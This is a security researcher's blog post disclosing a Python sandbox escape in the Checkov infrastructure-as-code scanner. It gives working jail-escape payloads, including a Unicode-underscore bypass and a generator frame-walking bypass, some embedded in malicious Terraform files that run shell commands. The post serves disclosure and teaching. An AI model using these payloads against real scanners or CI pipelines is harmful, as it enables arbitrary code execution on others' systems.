---
title: "CVE-2025-2180 - Breaking out of a Python Jail in a Popular IaC Scanning Tool"
date: "2025-10-16"
summary: " "
description: ""
toc: false
readTime: true
autonumber: false
math: false
tags: ["python"]
showTags: false
hideBg: true
draft: false
---
## The Quick Summary
* This blog post describes a vulnerability in the infrastructure-as-code scanning tool, [Checkov](https://github.com/bridgecrewio/checkov) that allows for arbitrary code execution if run on untrusted Terraform files. 
* The vulnerability involves escaping from a Python sandbox and evading a check that blocks double-underscore attributes. We'll walk through two bypasses, one involving unicode characters, and one that involves a trick with generators and digs deep into python internals.
* I was able to use this vulnerability to gain RCE on SaaS code scanning product. This CVE serves as a reminder that third-party code scanning or linting tools should be used with caution, and ideally should be executed within a sandbox.
## Background - An Earlier CVE in Checkov
Back in 2021, I was playing around with the IaC scanning tool [Checkov](https://github.com/bridgecrewio/checkov). Its pretty useful tool for identifying security issues in Terraform code, such as world-readable S3 buckets, overly-broad ingress rules, etc. While browsing through the source code I stumbled across a few interesting [lines of code](https://github.com/bridgecrewio/checkov/blob/65b28a4810e2ce668a063ea0077cab349852cba6/checkov/terraform/variable_rendering/evaluate_terraform.py#L46).

```python
def _try_evaluate(input_str):
    try:
        return eval(input_str, {"__builtins__": None}, SAFE_EVAL_DICT) # nosec
    except Exception:
      ...
```

Show this to any security nerd who is familiar with Python, and theyâ€™ll immediately recognize it - this is a classic example of an unsafe Python jail. Iâ€™m not entirely sure where the idea originated, but this specific invocation of `eval` is often considered to be a "safe" way to execute arbitrary user-supplied Python code. The idea is that if you remove the builtins (second argument to `eval`) and locals (third argument), the code that is passed into `eval` wonâ€™t have access to anything interesting, and thus canâ€™t do anything dangerous.

This is, of course, not the case. Python allows for a lot of introspection, and this jail leaves plenty of room for escape. The typical approach is to recover the builtins, which can usually be achieved by chaining together a series of [dunder](https://docs.python.org/3/reference/lexical_analysis.html#reserved-classes-of-identifiers) attributes. You start with `{}.__class__.__bases[0].__`, which gives you a reference to the `object` class. From there, you look through `.__subclassess__()` until you find something that gives you access to `__builtins__`. Lastly, you grab  `__import__` and use it to import `os.system`, then execute shell commands. Using list comprehensions, this can all be done within a single expression. A full python jail escape looks something like this [^1] :

```python {class="code-wrap"}
[x for x in {}.__class__.__bases__[0].__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('whoami')
``` 


In the case of Checkov, this code was being used to evaluate Terraform arguments. The vulnerability could be exploited by supplying Checkov a malicious Terraform file, such as the one below. Running Checkov on this file will cause `date >> /tmp/pwned_from_checkov` to run on the host system 
```hcl
resource "random_pet" "server" {
  keepers = {
    ami_id = "[x for x in {}.__class__.__bases__[0].__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('date >> /tmp/pwned_from_checkov')"
  }
}
```

I sent this POC to the Checkov maintainers through their responsible disclosure program.

## An Incomplete Fix
After assigning [CVE-2021-3040](https://nvd.nist.gov/vuln/detail/CVE-2021-3040) to this issue, the Checkov maintainers decided to fix this vulnerability by blocking any input string that contained a double underscore, theoretically blocking the ability to access the attributes necessary for the exploit.
```python
def evaluate(input_str):
    if "__" in input_str:
        logging.warning(f"got a substring with double underscore, which is not allowed. origin string: {input_str}")
        return input_str
    return eval(input_str, {"__builtins__": None}, SAFE_EVAL_DICT)  # nosec
```

This fix didnâ€™t sit well with me - it seemed plausible that there was a way to execute arbitrary code without using a double underscore. I didnâ€™t have POC, nor the time to research the problem further, so I decided to move on. Years later, this project caught my attention again and I noticed that `eval` code had not changed. I decided to spend some time looking for a bypass to the underscore check. After a bit of research and experimentation, I was able to produce two separate exploits that bypassed this check.

## Bypass One: Unicode Underscores
The first solution is a neat little party trick. Python allows the use of non-ascii characters in code, but applies a process called [NFKC Normalization](https://peps.python.org/pep-3131/) to translate these characters into their canonical ascii representation when they are processed by the interpreter. There are a handful of non-ASCII "underscores" that will be normalized by this process, and can be used as a drop-in replacement for an underscore in most places in Python code. One example is the [full-width low line](https://www.compart.com/en/unicode/U+FF3F). Crucially, these characters are normalized by the Python interpreter if they appear within code, but will remain untouched if they appear in strings. For example:

```
>> # Example character that will normalize to an underscore
>>> chr(0xFE4D)
'ï¹'
>>> underscore_example_variable = 123
>>> underscoreï¹exampleï¹variable
123
>>> '_' in 'noï¹underscoresï¹here'
False
```

This property allows us to bypass the `__ in input_str` check: these characters will be normalized _after_ the check, when the `eval` executes. We can reuse the previous exploit, swapping in a unicode character in place of the underscores:
```
resource "random_pet" "server" {
  keepers = {
    ami_id = "[x for x in {}._ï¹Žclass_ï¹Ž._ï¹Žbases_ï¹Ž[0]._ï¹Žsubclasses_ï¹Ž() if x._ï¹Žname_ï¹Ž == 'catch_warnings'][0]()._module._ï¹Žbuiltins_ï¹Ž['_'+'_import_'+'_']('os').system('date >> /tmp/unicode-example')"
  }
}
```

Running Checkov against this file again, gives us arbitrary code execution! Wow, that was quite easyðŸŽ‰

## Bypass Two: Walking Up the Call Stack
The unicode bypass felt a bit unsatisfying. I anticipated that the maintainers might fix this issue by simply normalizing unicode characters, so I decided to see if I could come up with a better exploit. Is there a clever way to sneak around the dunder check assuming no special unicode characters are allowed? 

As it turns out, yes! Hereâ€™s a sneak peak of the full exploit, then letâ€™s talk about how it works:

```
resource "random_pet" "server" {
  keepers = {
    ami_id = "(lambda gen: (gen:=(gen.gi_frame.f_back.f_back.f_globals for _ in [1])))(None).send(None).get('_'+ '_builtins_' +'_')['_'+'_import_'+'_']('os').system(â€˜whoamiâ€™)"
  }
}

```

{{< notice note>}}
Head's up, this is going to get in to some nitty-gritty details about python internals. If you'd prefer to skip this part, [click here to jump to the bottom](#impact).
{{< /notice >}}

### Generators
The execution environment in the `eval` is very limited: no builtins, no imports, no `getattr`, only a handful of functions available. We do have access to Python's built-in types, which includes generators. 

Generators are a lazily-evaluated way of returning a sequence of items - if you've ever seen the `yield` keyword in python code, you are familiar. Python also provides syntactic sugar for creating generators: the [generator expressions](https://peps.python.org/pep-0289/). The syntax is `(x for x in [1,2,3])`, which is conveniently allowed within the restricted `eval` environment:

```python
eval('(x for x in (1,2,3))', {'__builtins__': None}, {})
<generator object <genexpr> at 0x104f007c0>
```
Why is this useful? What we're really after is the generator's `gi_frame` attribute (note the lack of a double underscore), but in order to explain that we need to take a quick tangent into Python internals to learn about Frames.

### Frames

Every function call in Python creates a new [frame object](https://docs.python.org/3/reference/datamodel.html#frame-objects) that is pushed onto the interpreterâ€™s call stack. A frame holds a reference to the functionâ€™s compiled bytecode (`f_code`), the current instruction index (`f_lasti`), the functionâ€™s global and local namespaces, and several other execution details. Frames are linked together through the `f_back` attribute, which points to the callerâ€™s frame, forming a linked list that mirrors the call stack.

Generators use a Frame object for holding execution state, accessible via the `gi_frame` attribute. The frame is created when the generator is first advanced (by calling `next()` or `.send()`). After each yield, the frameâ€™s state is suspended, allowing it to be resumed on the next iteration. A generatorâ€™s frame also contains a `f_back` reference, which points to the caller's frame.

### A Path To an Exploit

Putting all these pieces together - we should be able to use a generator to escape our python jail and recover the builtins. A generator expression will allow us to create a generator object, from which we can access its frame via `generator.gi_frame`. This frame's globals and builtins will be empty because it was created from within the `eval` context, but we can use its `f_back` attribute to walk upwards on the call stack until we reach a frame that has a reference to the builtins.

![Diagram depicting the stack frame traversal](./media/frame-diagram.png)

The exploit code would essentially be:
```python
(i for i in [1,2,3])            # Generator Expression
.gi_frame.f_back.f_back         # Access frame, walk up two frames
.get('__builtins__')            # Grab builtins
['__import__'](os).system('')   # Grab import, run code.
```

If only it were so simple! There is one detail that makes this exploit quite a bit more complicated...

### A Missing `f_back`
If you try to run the code above, you'll notice the problem. The generator's `gi_frame` has an empty `f_back` pointer, which means no walking up the call stack, and no access to the builtins. This is the case for all generators - the `f_back` pointer is cleared after each iteration. You can see this happening in the Python [source code](https://github.com/python/cpython/blob/3.10/Objects/genobject.c#L217-L221) [^2] 

```c
result = _PyEval_EvalFrame(tstate, f, exc);
tstate->exc_info = gen->gi_exc_state.previous_item;
gen->gi_exc_state.previous_item = NULL;

/* Don't keep the reference to f_back any longer than necessary. It
* may keep a chain of frames alive or it could create a reference
* cycle. */
assert(f->f_back == tstate->frame);
Py_CLEAR(f->f_back);
```

Examining the Python source code reveals an oppurtunity, though. The `f_back` pointer is populated during each iteration of the generator (the call to `_PyEval_EvalFrame`), but cleared afterwards. If we are able to get _inside_ the generator and grab the `f_back` pointer before the generator yields, it should allow us to access the caller frame. How can we achieve that? We need to rely on some serious Python trickery for this one.

### A Generator With A Pointer To Itself
OK, here's the plan: we're going to make a generator that yields _its own_ `gi_frame.f_back` so that we can grab the reference before it is cleared. This involves defining a generator that references a variable in the local scope then assigning that variable to an instance of the generator, creating a circular reference where the generator has a pointer to _itself_. Here's what that looks like in long-form Python:
```python
gen = None # Varible that will hold the generator

def generator():
  # Before we yield, f_back is populated
  yield gen.gi_frame.f_back
    
gen = generator()        # Create the generator, assign it to gen
f_back = gen.send(None)  # Start the generator
```
This will give us access to a frame containing the `__builtins__`. Now the challenge is to figure out how to do that from within the `eval`. We are limited to a single expression, and can't define functions or assign variables. Thankfully, Python is a very expressive language, and you can pack a lot of madness into a single line.

### Packing it All Into One Expression
Although `eval` does not allow assignment, we can sneak around that limitation using the new walrus operator (`:=`). This will allow us create our generator and assign to a variable in one expression. Lastly, a call `send()` will start the generator and give us access to the frame we need:

```python
>>> (gen:=(gen.gi_frame.f_back for _ in [1])).send(None)
<frame at 0x1045f4f60, file '<stdin>-3', line 1, code <module>>
```

This is very close, but there is one additional step. The expression above will work in a Python REPL, but it will not work within an `eval` - the generator will not be able to resolve the `gen` variable when it executes. This is because of subtlety in how [free variables](https://docs.python.org/3/glossary.html#term-free-variable) are resolved within `eval`, explained [here](https://docs.python.org/3/reference/executionmodel.html#interaction-with-dynamic-features).

To get around this limitation, we need to create a [closure](https://realpython.com/python-closure/) that contains the `gen` variable. There are multiple ways to accomplish this, but I found that wrapping the entire expression in a lambda is the most elegant and readable.

Here is our our final exploit:
```python {class="code-wrap"}
(lambda gen: (gen:=(gen.gi_frame.f_back.f_back.f_globals for _ in [1])))(None).send(None).get('_'+ '_builtins_' +'_')['_'+'_import_'+'_']('os').system('whoami')
````

There's a lot going on in that single line of Python! Here's a breakdown that shows the exploit step-by-step.
![Image explaining the pieces of the exploit](./media/exploit.png)

## Impact
This vulnerability allows for arbitrary code execution if Checkov is run on an untrusted file. This is particularly interesting in the context of a CI system where `Checkov` may be run against files from a pull request, potentially allowing the contributor to execute code in the CI environment.

This vulnerability is especially concerning for any SaaS products that offer code scanning as a service and use Checkov under the hood. A few weeks after the fix was released, I went looking and found one such service that was still running a vulnerable version of Checkov. I created a POC demonstrating remote code execution in their environment and submitted it to them -  they fixed the issue within a few hours.

## The Fix: A Safer Way to Evaluate Python?
The Checkov maintainers [fixed](https://github.com/bridgecrewio/checkov/pull/7116) this issue by removing the `eval` statement and replacing it with [lmfit/asteval](https://github.com/lmfit/asteval), a "safe(ish) evaluator of Python expressions and statements". This library implements a more minimal Python interpreter by parsing then expression with `ast.Parse`, then using custom logic to evaluate the abstract syntax tree, blocking potentially dangerous attribute accesses or function calls. 

I wouldn't bet on `asteval` being completely bulletproof. Sandboxing python is notoriously difficult - although `asteval`'s strategy is a much smarter way to go about it, it still feels like betting against the house.

While writing this blog post I decided to review recent CTF challenges that involved Python jails as a way to catch up on the state-of-the-art. I was thoroughly impressed by the arsenal of tricks CTF players have developed for attacking Python jails. Suffice to say, I wouldn't trust any sort of Python-based `eval` sandboxing. If you find yourself in a position where you need to `eval` or `exec` user input, its probably best to wrap the whole thing in an OS-level sandbox.

Also while doing this CTF literature review, I discovered that this generator trick is not new. Some folks in the CTF community seems to have know about it for a while. In fact, it appeared as a challenge for [Samsung CTF 2023](https://github.com/SSTF-Office/SamsungCTF/blob/3c6760615404ea9babecffd8633ae8e96a137a41/2023_Hackers_Playground/pyjail/writeup.md), with four solves. Unsurprisingly, CTF players beat me to the punch on this jail escape. Regardless, it was a very fun little puzzle to solve ðŸ™‚.  

Thats all, thanks for reading!

[^1]: Depending on where the `eval` statement occurs, `__builtins__` might either be a dictionary or a module object, which will change the exploit slightly. In the case of a module, its often necessary to recover `__builtins__.getattr` first, then use that to access `__import__`
[^2]: This code snippet is from Python 3.10. The code in later Python versions is more convoluted, but the behavior remains the same. 
